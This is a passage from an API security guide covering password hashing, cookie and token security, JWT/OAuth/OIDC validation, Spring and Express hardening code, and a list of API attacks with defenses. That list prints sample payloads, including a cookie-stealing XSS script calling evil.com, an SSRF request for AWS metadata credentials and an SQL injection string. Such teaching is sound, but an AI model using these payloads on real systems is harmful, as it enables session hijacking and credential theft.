| PBKDF2         | Key Derivation| NO (CPU-bound)   | Legacy acceptable. Lacks memory    |
|                | Function      |                  | hardness; vulnerable to ASIC/GPU.  |
| bcrypt         | Password Hash | CPU & small cache| STRONG. Has hard 72-byte password  |
|                | (Eksblowfish) | bound (4 KB)     | limit; 4 KB state fits L1 cache.   |
| Argon2id       | Memory-Hard   | YES (Tunable     | GOLD STANDARD. PHC winner; combines|
|                | Password Hash | RAM, time, lanes)| Argon2d (GPU) and Argon2i (timing).|
+----------------+---------------+------------------+------------------------------------+
```

#### Salt, Work Factor, and Production Benchmarking
1. **Cryptographic Salt:** A unique, cryptographically secure random byte sequence generated per credential and stored alongside the hash digest. Salt ensures identical passwords produce distinct digests, defeating precomputed rainbow table attacks and cross-user correlation.
2. **Work Factor / Cost Calibration:** Forces candidate hash evaluation to consume substantial CPU cycles and memory. An authentic user performing an isolated login experiences a negligible delay, while an attacker attempting millions of offline guesses faces severe hardware and time bottlenecks.
3. **Benchmarking Over Prescriptions:** Universal cost-factor prescriptions (such as claiming "cost 12 is universally standard") ignore deployment reality: hardware capabilities vary widely between developer workstations and resource-constrained cloud containers. Engineering teams should benchmark password verification latency directly on target production hardware, tuning memory and iteration parameters to consume 100–300 ms per hash. This maximizes brute-force resistance while remaining strictly within the service's authentication latency and CPU throughput budget under peak login volume.

---

## Section 5 — Session, Cookie, and Token Security

### 5.1 Server-Side Sessions vs. Self-Contained Tokens

```
+-------------------------+----------------------------------+----------------------------------+
| Dimension               | Server-Side Sessions (Stateful)  | Self-Contained JWTs (Stateless)  |
+-------------------------+----------------------------------+----------------------------------+
| Storage Location        | Server: Redis, Database, Cache   | Client: Cookie or Memory;        |
|                         | Client: Opaque Session ID cookie | Server holds verification key.   |
| Revocation Speed        | INSTANT. Delete session ID from  | DIFFICULT. Token remains valid   |
|                         | Redis; user is immediately logged| until expiration unless an active|
|                         | out across all devices.          | central blacklist is maintained. |
| Server Memory / I/O     | Requires database/Redis lookup on| Zero database lookup for valid   |
|                         | EVERY single HTTP request.       | signature; purely CPU crypto.    |
| Horizontal Scalability  | Requires shared Redis cluster or | Trivially scalable across 10,000 |
|                         | sticky sessions at load balancer.| independent microservices.       |
| Payload Size            | Tiny (32-byte opaque session ID).| Large (500 to 2,000+ bytes in    |
|                         |                                  | HTTP headers on every request).  |
| Stale Data Risk         | None. User role changes reflect  | High. Role/claims remain frozen  |
|                         | immediately on next DB check.    | in token payload until expiry.   |
+-------------------------+----------------------------------+----------------------------------+
```

---

### 5.2 Browser Cookie Security Attributes and Prefixes

When an API serves browser clients, session identifiers and refresh tokens should be transmitted in HTTP cookies hardened with explicit security attributes and standard prefix constraints:

```http
Set-Cookie: __Host-sessionId=s%3A7a8f9b2c...;
            Secure;
            HttpOnly;
            SameSite=Lax;
            Path=/;
            Max-Age=3600
```

#### Core Security Attributes
1. **`Secure`**: Enforces that the cookie is transmitted **only** over encrypted HTTPS connections. The browser will never transmit the cookie over unencrypted plaintext HTTP, preventing passive network eavesdropping on untrusted Wi-Fi.
2. **`HttpOnly`**: Blocks client-side scripts from accessing the cookie via `document.cookie`. If an application contains an XSS flaw, an attacker cannot directly exfiltrate an `HttpOnly` session cookie via script.
3. **`SameSite` Policy (CSRF Mitigation)**: Governs whether cookies are attached to cross-site requests:
   - **`SameSite=Lax` (Practical Web Session Default):** The cookie is withheld on cross-site sub-requests (such as `<img>`, `<iframe>`, and cross-origin `fetch`/`POST` requests), neutralizing classic CSRF exploits. However, the cookie **is attached on top-level cross-site GET navigations** (e.g., when a user clicks a hyperlink to your app from an email, Slack, or search engine). This makes `Lax` the standard choice for general browser session management, as users arrive seamlessly authenticated.
   - **`SameSite=Strict` (High-Security Isolation):** The cookie is withheld on **all** cross-site requests without exception, including top-level GET navigation clicks. If a site uses `SameSite=Strict` for its primary session cookie, clicking a link from an external email or site causes the user to arrive appearing unauthenticated until they navigate internally. For this reason, `Strict` is **not** a universal default for web applications; it is specifically reserved for sensitive mutation portals, admin control planes, or dedicated transaction confirmation tokens.
   - **`SameSite=None`:** The cookie is attached to all cross-site requests (e.g. third-party embedded widgets). **Mandatory constraint:** Browsers reject `SameSite=None` unless `Secure` is also present.

#### The `__Host-` Cookie Prefix Standard (RFC 6265bis)
Cookie prefixes provide structural browser enforcement that cannot be overridden by weak or misconfigured attributes. The `__Host-` prefix is independent of `SameSite` policy and requires the browser to enforce five strict criteria:
1. The cookie name **must begin with `__Host-`** (case-sensitive).
2. The cookie **must have the `Secure` attribute**.
3. The cookie **must originate from a secure origin (HTTPS)**.
4. The cookie **must specify `Path=/`** (binding it to the entire origin).
5. The cookie **must omit the `Domain` attribute**. Omitting `Domain` prevents subdomain inheritance, ensuring that sibling or child subdomains (e.g., `vulnerable.sub.example.com`) cannot overwrite, shadow, or "cookie-toss" malicious session identifiers onto `example.com`.

---

### 5.3 Token Lifecycles: Access Tokens, Refresh Tokens, and Token Rotation

To balance horizontal scalability with security revocation, production token architectures employ a **dual-token lifecycle**:

```
[ Client ]               [ Authorization Server ]              [ Resource Server (API) ]
    |                               |                                      |
    | 1. Login (Credentials)        |                                      |
    |------------------------------>|                                      |
    | 2. Issue Token Pair           |                                      |
    |    - Short-Lived Access Token |                                      |
    |      (JWT, TTL: 10 mins)      |                                      |
    |    - Long-Lived Refresh Token |                                      |
    |      (Opaque, TTL: 7 days)    |                                      |
    |<------------------------------|                                      |
    |                                                                      |
    | 3. API Call (Access Token in Authorization Header)                   |
    |--------------------------------------------------------------------->|
    | 4. Stateless Cryptographic Signature & Expiry Verification           |
    |<---------------------------------------------------------------------|
    |                                                                      |
    | ... 10 minutes elapse; Access Token expires ...                      |
    |                                                                      |
    | 5. Refresh Request (Refresh Token)                                   |
    |------------------------------>|                                      |
    | 6. Check Revocation DB,       |                                      |
    |    Rotate Refresh Token       |                                      |
    |    (Issue new AT + new RT)    |                                      |
    |<------------------------------|                                      |
```

#### Automatic Refresh Token Rotation & Reuse Detection
What happens if an attacker steals a user's refresh token? If refresh tokens are static, the attacker maintains perpetual access.
- **Rotation:** Every time a refresh token is used to obtain a new access token, the authorization server **invalidates the old refresh token** and issues a brand-new refresh token.
- **Reuse Detection:** The server tracks token family hierarchies. If an *already invalidated* refresh token is presented again, the authorization server concludes that token theft has occurred (either the legitimate client or an attacker is presenting a replayed token). **Immediate action:** The server revokes the entire token family, terminating all active sessions for that user.

---

## Section 6 — JWT, OAuth 2.0, and OpenID Connect

### 6.1 JSON Web Token (JWT) Architecture (RFC 7519)

A JSON Web Token is a compact, URL-safe representation of claims transferred between two parties. It consists of three distinct Base64URL-encoded JSON segments separated by periods (`.`):

```
+-------------------+ . +-----------------------+ . +---------------------------+
|      Header       |   |        Payload        |   |         Signature         |
| {"alg": "RS256",  |   | {"sub": "usr_42",     |   | Cryptographic signature   |
|  "typ": "JWT",    |   |  "iss": "auth.ex.com",|   | calculated over:          |
|  "kid": "k-2026"} |   |  "exp": 1792000000}   |   | Base64URL(H) + "." +      |
|                   |   |                       |   | Base64URL(P)              |
+-------------------+   +-----------------------+   +---------------------------+
```

#### Why Base64URL Is Not Encryption
A signed JWT (JWS, RFC 7515) is **tamper-evident, but completely transparent**. Anyone who intercepts a JWT can paste it into a decoder and inspect all claims in plaintext. Never place credit card numbers, passwords, internal network addresses, or unencrypted PII inside a JWT payload unless using JSON Web Encryption (JWE, RFC 7516).

#### Essential Registered Claims (RFC 7519 Section 4.1)
- `iss` (Issuer): Identity of the security token service that issued the JWT. Must match expected API identity.
- `sub` (Subject): Principal identifier (User ID, Service ID).
- `aud` (Audience): Intended recipient(s) of the token. The resource server **must** reject tokens where `aud` does not match its own service identifier.
- `exp` (Expiration Time): Unix epoch timestamp after which the token is invalid.
- `nbf` (Not Before): Timestamp before which the token must not be accepted.
- `iat` (Issued At): Timestamp of creation.
- `jti` (JWT ID): Unique UUID for the token; enables one-time replay tracking.

#### Common JWT Vulnerabilities & The Verification Checklist
1. **The `alg: "none"` Exploit:** Early flawed libraries accepted tokens with `{"alg": "none"}`, bypassing signature checks entirely. Defense: Explicitly allowlist acceptable algorithms (`RS256`, `ES256`).
2. **Algorithm Confusion (HMAC vs. RSA):** If an API configured for RS256 (asymmetric) accepts HS256 (symmetric) without verifying the algorithm type, an attacker can sign a forged token using the API's *public key* (readily available) as the symmetric HMAC secret! Defense: Hardcode the expected algorithm during verifier initialization.
3. **Clock Skew:** Network servers may have small time synchronization drifts (NTP). Verifiers should allow a small clock skew tolerance (typically 30–60 seconds).
4. **Key Identifiers (`kid`) & JWKS:** Distributed services retrieve public verification keys from a JSON Web Key Set (`/.well-known/jwks.json`). Ensure the `kid` header does not permit path traversal (e.g., `../../dev/null`) or SQL injection.

---

### 6.2 OAuth 2.0 Framework (RFC 6749)

OAuth 2.0 is an **authorization delegation framework**, enabling a third-party application to obtain limited access to an HTTP service on behalf of a resource owner.

#### Core Roles in OAuth 2.0
1. **Resource Owner:** The entity capable of granting access to a protected resource (typically the human end-user).
2. **Client:** The third-party application making protected resource requests on behalf of the resource owner.
3. **Resource Server:** The API hosting protected resources, accepting access tokens.
4. **Authorization Server:** The server authenticating the resource owner and issuing tokens after obtaining consent.

#### Modern Grant Types
1. **Authorization Code Grant with PKCE (RFC 7636):** The mandatory modern standard for browser-based Single Page Applications (SPAs), mobile native apps, and server-side web applications.
2. **Client Credentials Grant:** Used for machine-to-machine (M2M) backend daemon communication where no human user is present.
3. **DEPRECATED: Implicit Grant:** Tokens were returned directly in the browser URL fragment. Insecure; completely deprecated in OAuth 2.1.
4. **DEPRECATED: Resource Owner Password Credentials (ROPC):** Required the user to hand their raw password to the client application. Violates credential delegation principles; removed in OAuth 2.1.

#### Proof Key for Code Exchange (PKCE) Mechanics
PKCE prevents authorization code interception attacks on public clients:
1. Client generates a cryptographically random string: `code_verifier`.
2. Client derives: `code_challenge = BASE64URL(SHA256(code_verifier))`.
3. Client redirects to Authorization Server with `code_challenge` and `code_challenge_method=S256`.
4. Authorization Server stores the challenge and returns an authorization code.
5. Client exchanges the code for tokens, transmitting the original plaintext `code_verifier`.
6. Server hashes the verifier with SHA-256 and compares it to the stored challenge. An intercepted code is useless to an attacker because they cannot generate the matching verifier!

---

### 6.3 OpenID Connect (OIDC): Identity on Top of OAuth 2.0

OAuth 2.0 provides **authorization** ("What may the client do?"), but intentionally specifies nothing about **identity** ("Who is the user?"). OpenID Connect adds an identity layer on top of OAuth 2.0:

```
+------------------------------------+------------------------------------+
| OAuth 2.0 Access Token             | OpenID Connect ID Token            |
+------------------------------------+------------------------------------+
| Target: Resource Server (API)      | Target: Client Application         |
| Purpose: Authorization Credential  | Purpose: Authentication Assertion  |
| Format: Opaque string or JWT       | Format: Always a signed JWT (JWS)  |
| Content: Scopes, tenant, user ID   | Content: Profile info, email, auth |
|                                    |          timestamp, nonce          |
| Treated as opaque bearer by client | Decoded and validated by client app|
+------------------------------------+------------------------------------+
```

#### Decoding vs. Cryptographic Validation of ID Tokens
A pervasive and dangerous anti-pattern is assuming that Base64URL-decoding an ID token to inspect its claims constitutes validation. Anyone can forge an unauthenticated JSON payload with `{"sub": "admin", "email": "ceo@example.com"}` and encode it into a three-part string.

Before a client application trusts any identity assertion inside an ID token, it **must perform rigorous cryptographic validation**:
1. **Signature Verification:** Verify the token's JWS signature against the Identity Provider's public keys published at its well-known JWKS endpoint (`/.well-known/jwks.json`), matching the `kid` (Key ID) header and using the expected asymmetric algorithm (`RS256` or `ES256`).
2. **Issuer Verification (`iss`):** Assert that the `iss` claim exactly matches the expected IdP issuer URL (e.g., `https://accounts.example.com`).
3. **Audience Verification (`aud`):** Assert that the `aud` claim contains the client application's registered `client_id`. Tokens issued for other clients must be rejected to prevent token-substitution attacks.
4. **Temporal Validity (`exp`, `iat`, `nbf`):** Verify that the current system timestamp is strictly within the validity window (allowing at most 1–2 minutes for clock skew).
5. **Nonce Binding (`nonce`):** If the client generated a cryptographically random `nonce` and stored it in the user's session before initiating the authorization redirect, verify that the ID token's `nonce` claim matches the session nonce identically. This cryptographically binds the issued token to that specific client session, preventing token injection and replay attacks.
6. **Token Boundary Separation:** ID tokens are strictly intended for the client application to establish session identity and render user details in UI. **ID tokens must never be sent as authorization credentials to Resource Server APIs.** Backend APIs expect OAuth 2.0 Access Tokens.

---

## Section 7 — Spring Security Implementation

### 7.1 The Spring Security 6.x Filter Chain Architecture

In Spring Boot 3.x (Spring Security 6.x), the deprecated `WebSecurityConfigurerAdapter` is completely removed. Security configuration is declared by providing a `@Bean` returning a `SecurityFilterChain`.

```
[ Incoming HTTP Request ]
          |
          v
+--------------------------------------------------------------------------+
| DelegatingFilterProxy (Servlet Container / ApplicationContext bridge)     |
+--------------------------------------------------------------------------+
          |
          v
+--------------------------------------------------------------------------+
| FilterChainProxy (Manages SecurityFilterChains matching RequestMatcher)  |
+--------------------------------------------------------------------------+
          |
          +---> SecurityContextHolderFilter (Loads existing SecurityContext)
          |
          +---> HeaderWriterFilter (Injects security response headers)
          |
          +---> CorsFilter (Processes preflight and cross-origin headers)
          |
          +---> CsrfFilter (Validates anti-CSRF token on mutable methods)
          |
          +---> BearerTokenAuthenticationFilter (Extracts & parses JWT)
          |
          +---> ExceptionTranslationFilter (Catches AuthN/AuthZ exceptions)
          |
          +---> AuthorizationFilter (Evaluates RequestMatcher access rules)
          |
          v
[ Spring MVC DispatcherServlet / Controller ]
```

---

### 7.2 Idiomatic Spring Boot 3.x / Spring Security 6.x Configuration

```java
package com.example.api.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpMethod;
import org.springframework.security.config.Customizer;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;

import java.util.List;

@Configuration
@EnableWebSecurity
@EnableMethodSecurity(prePostEnabled = true) // Activates @PreAuthorize / @PostAuthorize
public class SecurityConfiguration {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        return http
            // 1. CORS Configuration
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            
            // 2. Disable CSRF for stateless REST APIs using Bearer tokens
            .csrf(csrf -> csrf.disable())
            
            // 3. Stateless session policy (no HttpSession created or used)
            .sessionManagement(session -> 
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            
            // 4. Endpoint Authorization Rules (Ordering matters: Specific -> General)
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/v1/auth/**", "/api/v1/public/**").permitAll()
                .requestMatchers(HttpMethod.GET, "/api/v1/products/**").permitAll()
                .requestMatchers("/api/v1/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/v1/orders/**").hasAnyRole("CUSTOMER", "ADMIN")
                .anyRequest().authenticated()
            )
            
            // 5. Configure OAuth2 Resource Server for JWT verification
            .oauth2ResourceServer(oauth2 -> oauth2.jwt(Customizer.withDefaults()))
            
            .build();
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("https://app.example.com"));
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"));
        config.setAllowedHeaders(List.of("Authorization", "Content-Type", "Idempotency-Key"));
        config.setAllowCredentials(true);
        config.setMaxAge(3600L); // 1 hour preflight cache

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);
        return source;
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        // Work factor tuned to target production hardware (benchmarked to ~100-250ms)
        return new BCryptPasswordEncoder(12);
    }
}
```

#### When Is Disabling CSRF Safe vs. a Lethal Vulnerability?
A common interview and architectural mistake is treating `.csrf(csrf -> csrf.disable())` as standard boilerplate for every modern REST API:
1. **When Disabling CSRF Is Appropriate:** Disabling CSRF is **strictly safe only** when the application is completely stateless (`SessionCreationPolicy.STATELESS`) **and** authentication relies exclusively on non-ambient credentials (such as an `Authorization: Bearer <token>` header). Browsers never automatically attach custom request headers cross-origin; therefore, cross-site request forgery is structurally impossible for pure bearer-token APIs.
2. **When Disabling CSRF Is a Catastrophic Vulnerability:** If any part of the API serves browser clients where authentication relies on **ambient credentials** (session cookies or HTTP Basic Authentication automatically managed and attached by the browser), disabling CSRF exposes the API to trivial request forgery! An attacker hosting an external website can submit mutating forms or JavaScript requests that execute under the victim's authenticated session.
3. **Cookie-Authenticated REST/SPA Configuration:** For browser applications using cookie-based authentication, CSRF protection must remain active, configured with a token repository that Single Page Applications can consume:
   ```java
   .csrf(csrf -> csrf
       .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
       .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
   )
   ```
   The browser receives the CSRF token in an accessible cookie (`XSRF-TOKEN`). The SPA's HTTP interceptor reads this cookie value and supplies it in a dedicated header (`X-XSRF-TOKEN`) on all mutating requests (`POST`, `PUT`, `DELETE`, `PATCH`).

#### Roles vs. Authorities in Spring Security
- **Authority:** A raw permission string (e.g., `orders:write`, `SCOPE_read`). Checked via `.hasAuthority("orders:write")`.
- **Role:** A high-level identity grouping. Spring Security conventions automatically prepend `ROLE_` to roles!
  - Calling `.hasRole("ADMIN")` checks for the authority `ROLE_ADMIN`.
  - Storing `"ADMIN"` in the database without understanding this prefix mapping is a notorious source of unexplained 403 Forbidden bugs.

---

## Section 8 — Node.js / Express API Security

### 8.1 Trust Boundaries in Express Applications

Express.js is unopinionated and minimalist. Unlike Spring Security's pre-packaged architecture, security in an Express backend must be intentionally constructed across its middleware chain:

```
[ Request ] ---> [ Helmet ] ---> [ CORS ] ---> [ Rate Limiter ] ---> [ Body Parser (Size Limited) ]
                                                                             |
[ Route Handler ] <--- [ BOLA Ownership Check ] <--- [ AuthZ ] <--- [ AuthN ]
```

### 8.2 Production-Grade TypeScript Security Pipeline

```typescript
import express, { Request, Response, NextFunction } from 'express';
import helmet from 'helmet';
import cors from 'cors';
import rateLimit from 'express-rate-limit';
import { z } from 'zod';
import jwt from 'jsonwebtoken';

const app = express();

// Fail fast on missing cryptographic configuration at startup
const JWT_PUBLIC_KEY = process.env.JWT_PUBLIC_KEY;
if (!JWT_PUBLIC_KEY) {
    throw new Error('FATAL: JWT_PUBLIC_KEY environment variable is required at startup.');
}

// 1. Security Headers via Helmet (HSTS, CSP, X-Frame-Options, Sniff prevention)
app.use(helmet());

// 2. Strict CORS allowlist
app.use(cors({
    origin: ['https://dashboard.example.com'],
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization', 'Idempotency-Key'],
    credentials: true,
    maxAge: 3600
}));

// 3. Strict Payload Size Limiting (Prevents Memory Buffer Denial of Service)
app.use(express.json({ limit: '50kb' }));

// 4. Rate Limiting Middleware
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 requests per window
    standardHeaders: true, // Return X-RateLimit-* headers
    legacyHeaders: false,
    message: { error: 'TOO_MANY_REQUESTS', message: 'Rate limit exceeded. Try again later.' }
});
app.use('/api/', apiLimiter);

// 5. Authentication Middleware & Verified Claims Validation
const VerifiedClaimsSchema = z.object({
    sub: z.string().min(1),
    role: z.string().min(1),
    tenantId: z.string().min(1),
    iss: z.literal('https://auth.example.com'),
    aud: z.literal('https://api.example.com'),
    exp: z.number().int()
});

export type VerifiedClaims = z.infer<typeof VerifiedClaimsSchema>;

export interface AuthenticatedRequest extends Request {
    user?: VerifiedClaims;
}

export function authenticateJwt(req: AuthenticatedRequest, res: Response, next: NextFunction) {
    const authHeader = req.headers['authorization'];
    if (!authHeader?.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'UNAUTHENTICATED', message: 'Missing token' });
    }
    const token = authHeader.substring(7);
    try {
        const rawPayload = jwt.verify(token, JWT_PUBLIC_KEY, {
            algorithms: ['RS256'],
            audience: 'https://api.example.com',
            issuer: 'https://auth.example.com'
        });

        // Validate shape, types, and presence of critical claims without unsafe casts
        const parsed = VerifiedClaimsSchema.safeParse(rawPayload);
        if (!parsed.success) {
            return res.status(401).json({
                error: 'INVALID_TOKEN_CLAIMS',
                message: 'Token claims do not satisfy application trust boundary requirements'
            });
        }

        req.user = parsed.data;
        next();
    } catch (err) {
        return res.status(401).json({ error: 'INVALID_TOKEN', message: 'Token verification failed' });
    }
}

// 6. Runtime Schema Validation at Trust Boundary (Zod)
const CreateOrderSchema = z.object({
    customerId: z.string().uuid(),
    items: z.array(z.object({
        productId: z.string().min(1),
        quantity: z.number().int().positive()
    })).min(1),
    currency: z.string().regex(/^[A-Z]{3}$/)
}).strict(); // .strict() rejects unknown fields (anti-mass-assignment)

app.post('/api/v1/orders', authenticateJwt, async (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
    try {
        const validatedData = CreateOrderSchema.parse(req.body);
        // Execute business logic with validatedData...
        res.status(201).json({ status: 'CREATED', data: validatedData });
    } catch (err) {
        if (err instanceof z.ZodError) {
            return res.status(400).json({
                error: 'VALIDATION_FAILED',
                details: err.errors.map(e => ({ field: e.path.join('.'), message: e.message }))
            });
        }
        next(err);
    }
});

// 7. Centralized 4-Argument Safe Error Handler
app.use((err: any, req: Request, res: Response, next: NextFunction) => {
    const status = err.status || 500;
    // Log complete stack internally; mask internal details from client response
    console.error(`[Error] ${req.method} ${req.url} - ${err.message}`, err.stack);
    res.status(status).json({
        type: 'about:blank',
        title: status === 500 ? 'Internal Server Error' : err.message,
        status: status,
        instance: req.originalUrl,
        timestamp: new Date().toISOString()
    });
});
```

---

## Section 9 — API Attack Surfaces and Defenses

This section analyzes 18 critical API attack vectors, providing the threat model, vulnerable pattern, exploit mechanism, concrete defense, and verification strategy for each.

### 1. Broken Object Level Authorization (BOLA / IDOR)
- **Threat Model:** An authenticated user substitutes another user's resource identifier in API parameters to access or mutate unauthorized data.
- **Vulnerable Pattern:** `SELECT * FROM accounts WHERE id = :id;`
- **Exploit:** User Alice (Account 101) calls `GET /api/accounts/102` and reads Bob's financial data.
- **Defense:** Enforce tenant/owner scoping on every query: `SELECT * FROM accounts WHERE id = :id AND user_id = :currentUserId;`
- **Testing Strategy:** Negative unit/integration tests asserting that User A receives 403 or 404 when querying User B's resource ID.
- **Common Misconception:** Believing that using random UUIDs prevents BOLA. UUIDs obscure IDs, but do not authorize access; an attacker discovering a UUID via logs or referrals can still exploit the endpoint.

### 2. Broken Function Level Authorization (BFLA)
- **Threat Model:** Regular users access privileged API endpoints due to missing role checks at the controller or gateway level.
- **Vulnerable Pattern:** Hiding the `/admin/users` button in the UI while leaving the backend API endpoint accessible to any bearer token.
- **Exploit:** An unprivileged user sends `DELETE /api/v1/admin/users/99` using cURL.
- **Defense:** Default-deny security configuration; annotate administrative controllers with `@PreAuthorize("hasRole('ADMIN')")`.
- **Testing Strategy:** Send administrative requests with standard user tokens; assert HTTP 403 Forbidden.
- **Common Misconception:** Assuming UI menu restrictions provide API security.

### 3. Mass Assignment and Property-Level Authorization
- **Threat Model:** Client payloads bind directly to internal domain models, allowing attackers to overwrite sensitive entity attributes.
- **Vulnerable Pattern:** `User user = new User(); BeanUtils.copyProperties(dto, user);` or `User.create(req.body);`
- **Exploit:** Attacker appends `"isSuperAdmin": true` or `"accountBalance": 1000000` to a profile update payload.
- **Defense:** Strict DTO projection; explicitly map only permitted fields. Reject unknown fields with `.strict()` in Zod.
- **Testing Strategy:** Transmit forbidden fields in test payloads; verify database entity remains unchanged.
- **Common Misconception:** Believing that TypeScript interfaces protect against mass assignment at runtime.

### 4. SQL Injection (SQLi)
- **Threat Model:** Untrusted input is concatenated into SQL strings, altering query semantics.
- **Vulnerable Pattern:** `entityManager.createQuery("FROM User WHERE email = '" + email + "'");`
- **Exploit:** Inputting `' OR '1'='1` dumps entire databases or bypasses passwords.
- **Defense:** 100% Parameterized queries (`?1` or `:email` in JPA/Hibernate, `$1` in pg).
- **Testing Strategy:** Automated static analysis with Semgrep/SonarQube; automated dynamic testing passing SQL metacharacters (`'`, `"`, `;`).
- **Common Misconception:** Assuming ORMs automatically eliminate SQL injection (raw native queries in ORMs are equally vulnerable).

### 5. Cross-Site Scripting (XSS)
- **Threat Model:** Unsanitized user data returned by an API is executed as script in a browser origin.
- **Vulnerable Pattern:** Storing raw HTML/script tags and returning them with `Content-Type: text/html`.
- **Exploit:** Attacker stores `<script>fetch('http://evil.com?c='+document.cookie)</script>` in profile bio.
- **Defense:** Return pure JSON (`Content-Type: application/json`); contextual output encoding on frontend; strict Content Security Policy (CSP).
- **Testing Strategy:** Inject script payloads into input fields; assert API returns serialized strings without browser execution context.
- **Common Misconception:** Believing that backend APIs must HTML-sanitize inputs before saving (sanitization is context-dependent and belongs primarily on output rendering).

### 6. Cross-Site Request Forgery (CSRF)
- **Threat Model:** An attacker tricks a victim's browser into executing an unwanted action on a trusted site where the victim is authenticated via cookies.
- **Vulnerable Pattern:** Cookie-based authentication without `SameSite` or anti-CSRF synchronizer tokens on state-changing endpoints.
- **Exploit:** Malicious site embeds `<form action="https://bank.com/transfer" method="POST">` which the browser auto-submits with session cookies.
- **Defense:** `SameSite=Strict` cookies, custom headers (`X-Requested-With`), anti-CSRF synchronizer tokens.
- **Testing Strategy:** Attempt cross-origin POST requests without CSRF tokens; assert 403 Forbidden.
- **Common Misconception:** Believing APIs using Bearer tokens in `Authorization` headers require CSRF protection (browsers never auto-attach headers across origins).

### 7. Server-Side Request Forgery (SSRF)
- **Threat Model:** An API accepts a user-supplied URL and fetches it server-side, allowing attackers to access internal cloud metadata or microservices.
- **Vulnerable Pattern:** `restTemplate.getForObject(userSuppliedWebhookUrl, String.class);`
- **Exploit:** Supplying `http://169.254.169.254/latest/meta-data/iam/` to steal AWS cloud credentials.
- **Defense:** Strict IP allowlisting; blocking private IP ranges (RFC 1918, link-local `169.254.0.0/16`); dedicated egress proxies.
- **Testing Strategy:** Supply private loopback (`127.0.0.1`) and cloud metadata URLs; assert immediate rejection.
- **Common Misconception:** Validating domain names via regex without resolving DNS (vulnerable to DNS Rebinding).

### 8. Credential Stuffing and Brute Force
- **Threat Model:** Automated bots test lists of compromised username/password pairs against authentication endpoints.
- **Vulnerable Pattern:** Unthrottled login routes.
- **Exploit:** 50,000 attempts per second until valid credentials match.
- **Defense:** IP and account-based rate limiting, CAPTCHA on repeated failures, multi-factor authentication (MFA).
- **Testing Strategy:** Fire 100 rapid failed logins; verify endpoint returns 429 and locks further attempts.
- **Common Misconception:** Limiting by IP alone (attackers utilize residential proxy networks spanning millions of distinct IPs).

### 9. Excessive Resource Consumption
- **Threat Model:** Unconstrained API inputs trigger massive CPU or memory allocations, exhausting server resources.
- **Vulnerable Pattern:** Allowing unpaginated queries (`GET /api/transactions` returning 10 million rows).
- **Exploit:** Single request triggers OutOfMemoryError and crashes the JVM or Node process.
- **Defense:** Mandatory page size limits (`maxLimit = 100`), query timeouts, payload size limits.
- **Testing Strategy:** Transmit `?limit=1000000`; assert server clamps to maximum allowable boundary.
- **Common Misconception:** Assuming database indexes prevent resource exhaustion from large result sets.

### 10. Sensitive Data Exposure
- **Threat Model:** Endpoints serialize internal entity fields directly to JSON, leaking PII or secrets.
- **Vulnerable Pattern:** `return userRepository.findAll();` (serializing `password_hash`, `ssn`, `stripe_secret`).
- **Exploit:** Inspecting network response tabs reveals hidden sensitive attributes.
- **Defense:** Dedicated response DTOs; Jackson `@JsonIgnore` / `@JsonProperty(access = Access.WRITE_ONLY)`.
- **Testing Strategy:** Serialization unit tests verifying zero sensitive fields appear in output JSON schemas.
- **Common Misconception:** Relying on client-side frontend code to filter out sensitive attributes.

### 11. Security Misconfiguration
- **Threat Model:** Default passwords, debug endpoints, verbose error pages, or unneeded features enabled in production.
- **Vulnerable Pattern:** Spring Boot Actuator exposing `/actuator/env` or `/actuator/heapdump` to the public internet.
- **Exploit:** Reading environment variables containing API keys and database credentials.
- **Defense:** Secure default configurations; lock down Actuator routes; automated configuration scanning.
- **Testing Strategy:** Automated port and path scanning against production candidate environments.
- **Common Misconception:** Believing that obscurity (obscure port or URL) provides security.

### 12. Insecure File Upload Handling
- **Threat Model:** Attackers upload malicious executables, web shells, or decompression bombs.
- **Vulnerable Pattern:** Storing uploaded files directly in the web server document root using the client-supplied filename.
- **Exploit:** Uploading `shell.php` or `exploit.jsp` and invoking it via direct URL.
- **Defense:** Validate magic bytes (file signature), generate random UUID filenames, store files in cloud object storage (S3) with private ACLs.
- **Testing Strategy:** Attempt uploading executable files masquerading as images (`test.jpg.exe`); verify rejection.
- **Common Misconception:** Validating file extensions (`.png`) alone without checking underlying byte headers.

### 13. Unsafe Redirects (Open Redirectors)
- **Threat Model:** An API accepts arbitrary destination URLs for redirects, facilitating phishing.
- **Vulnerable Pattern:** `response.sendRedirect(request.getParameter("returnUrl"));`
- **Exploit:** `https://bank.com/login?redirect=https://evil-phishing-bank.com`
- **Defense:** Validate destination against an explicit origin allowlist; use relative paths exclusively.
- **Testing Strategy:** Pass external arbitrary domains to redirect parameters; verify 400 Bad Request.
- **Common Misconception:** Checking `url.contains("bank.com")` (attacker bypasses with `bank.com.evil.com`).

### 14. Replay and Idempotency Insecurity
- **Threat Model:** Intercepted, retried, or duplicate requests trigger duplicate state mutations (e.g., executing a financial transfer twice).
